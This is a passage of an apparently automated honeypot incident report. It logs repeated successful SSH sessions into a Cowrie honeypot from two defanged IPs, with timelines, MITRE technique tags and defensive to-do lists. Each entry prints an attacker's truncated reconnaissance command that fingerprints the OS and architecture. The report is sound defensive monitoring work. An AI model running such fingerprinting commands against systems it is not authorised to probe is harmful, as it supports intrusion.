| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:54 |
| **Last Seen** | 2026-07-24 19:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:54:37` | `cowrie.session.connect` |
| `2026-07-24 19:54:37` | `cowrie.client.version` |
| `2026-07-24 19:54:37` | `cowrie.client.kex` |
| `2026-07-24 19:54:39` | `cowrie.login.success` |
| `2026-07-24 19:54:40` | `cowrie.session.params` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.success` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.command.input` |
| `2026-07-24 19:54:40` | `cowrie.log.closed` |
| `2026-07-24 19:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb4499fc092

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:54 |
| **Last Seen** | 2026-07-24 19:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:54:49` | `cowrie.session.connect` |
| `2026-07-24 19:54:50` | `cowrie.client.version` |
| `2026-07-24 19:54:50` | `cowrie.client.kex` |
| `2026-07-24 19:54:53` | `cowrie.login.success` |
| `2026-07-24 19:54:55` | `cowrie.session.params` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.success` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:55` | `cowrie.command.input` |
| `2026-07-24 19:54:56` | `cowrie.log.closed` |
| `2026-07-24 19:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fefa2d2d25e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:55 |
| **Last Seen** | 2026-07-24 19:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:55:57` | `cowrie.session.connect` |
| `2026-07-24 19:55:58` | `cowrie.client.version` |
| `2026-07-24 19:55:58` | `cowrie.client.kex` |
| `2026-07-24 19:56:01` | `cowrie.login.success` |
| `2026-07-24 19:56:03` | `cowrie.session.params` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.success` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:03` | `cowrie.command.input` |
| `2026-07-24 19:56:04` | `cowrie.log.closed` |
| `2026-07-24 19:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d2041ce867

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:56 |
| **Last Seen** | 2026-07-24 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:56:14` | `cowrie.session.connect` |
| `2026-07-24 19:56:14` | `cowrie.client.version` |
| `2026-07-24 19:56:14` | `cowrie.client.kex` |
| `2026-07-24 19:56:15` | `cowrie.login.success` |
| `2026-07-24 19:56:16` | `cowrie.session.params` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.success` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.command.input` |
| `2026-07-24 19:56:16` | `cowrie.log.closed` |
| `2026-07-24 19:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c005406fbf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:57 |
| **Last Seen** | 2026-07-24 19:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:57:04` | `cowrie.session.connect` |
| `2026-07-24 19:57:05` | `cowrie.client.version` |
| `2026-07-24 19:57:05` | `cowrie.client.kex` |
| `2026-07-24 19:57:08` | `cowrie.login.success` |
| `2026-07-24 19:57:11` | `cowrie.session.params` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.success` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.command.input` |
| `2026-07-24 19:57:11` | `cowrie.log.closed` |
| `2026-07-24 19:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10e426c3de5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:57 |
| **Last Seen** | 2026-07-24 19:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:57:52` | `cowrie.session.connect` |
| `2026-07-24 19:57:52` | `cowrie.client.version` |
| `2026-07-24 19:57:52` | `cowrie.client.kex` |
| `2026-07-24 19:57:53` | `cowrie.login.success` |
| `2026-07-24 19:57:54` | `cowrie.session.params` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.success` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:54` | `cowrie.command.input` |
| `2026-07-24 19:57:55` | `cowrie.log.closed` |
| `2026-07-24 19:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0484fc9afe13

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:58 |
| **Last Seen** | 2026-07-24 19:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:58:10` | `cowrie.session.connect` |
| `2026-07-24 19:58:11` | `cowrie.client.version` |
| `2026-07-24 19:58:11` | `cowrie.client.kex` |
| `2026-07-24 19:58:13` | `cowrie.login.success` |
| `2026-07-24 19:58:16` | `cowrie.session.params` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.success` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:16` | `cowrie.command.input` |
| `2026-07-24 19:58:17` | `cowrie.log.closed` |
| `2026-07-24 19:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79688c99b192

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:59 |
| **Last Seen** | 2026-07-24 19:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:59:17` | `cowrie.session.connect` |
| `2026-07-24 19:59:18` | `cowrie.client.version` |
| `2026-07-24 19:59:18` | `cowrie.client.kex` |
| `2026-07-24 19:59:21` | `cowrie.login.success` |
| `2026-07-24 19:59:23` | `cowrie.session.params` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.success` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:23` | `cowrie.command.input` |
| `2026-07-24 19:59:24` | `cowrie.log.closed` |
| `2026-07-24 19:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a355f5ebd6ff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:59 |
| **Last Seen** | 2026-07-24 19:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:59:32` | `cowrie.session.connect` |
| `2026-07-24 19:59:33` | `cowrie.client.version` |
| `2026-07-24 19:59:33` | `cowrie.client.kex` |
| `2026-07-24 19:59:34` | `cowrie.login.success` |
| `2026-07-24 19:59:35` | `cowrie.session.params` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.success` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.command.input` |
| `2026-07-24 19:59:35` | `cowrie.log.closed` |
| `2026-07-24 19:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b662adf0aad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:00 |
| **Last Seen** | 2026-07-24 20:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:00:25` | `cowrie.session.connect` |
| `2026-07-24 20:00:26` | `cowrie.client.version` |
| `2026-07-24 20:00:26` | `cowrie.client.kex` |
| `2026-07-24 20:00:29` | `cowrie.login.success` |
| `2026-07-24 20:00:31` | `cowrie.session.params` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.success` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:31` | `cowrie.command.input` |
| `2026-07-24 20:00:32` | `cowrie.log.closed` |
| `2026-07-24 20:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbd32f1fe4d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:01 |
| **Last Seen** | 2026-07-24 20:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:01:16` | `cowrie.session.connect` |
| `2026-07-24 20:01:16` | `cowrie.client.version` |
| `2026-07-24 20:01:16` | `cowrie.client.kex` |
| `2026-07-24 20:01:17` | `cowrie.login.success` |
| `2026-07-24 20:01:18` | `cowrie.session.params` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.success` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.command.input` |
| `2026-07-24 20:01:18` | `cowrie.log.closed` |
| `2026-07-24 20:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502cc44dfa2b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:01 |
| **Last Seen** | 2026-07-24 20:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:01:33` | `cowrie.session.connect` |
| `2026-07-24 20:01:33` | `cowrie.client.version` |
| `2026-07-24 20:01:33` | `cowrie.client.kex` |
| `2026-07-24 20:01:37` | `cowrie.login.success` |
| `2026-07-24 20:01:39` | `cowrie.session.params` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.success` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:39` | `cowrie.command.input` |
| `2026-07-24 20:01:40` | `cowrie.log.closed` |
| `2026-07-24 20:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb89a55a029

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:02 |
| **Last Seen** | 2026-07-24 20:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
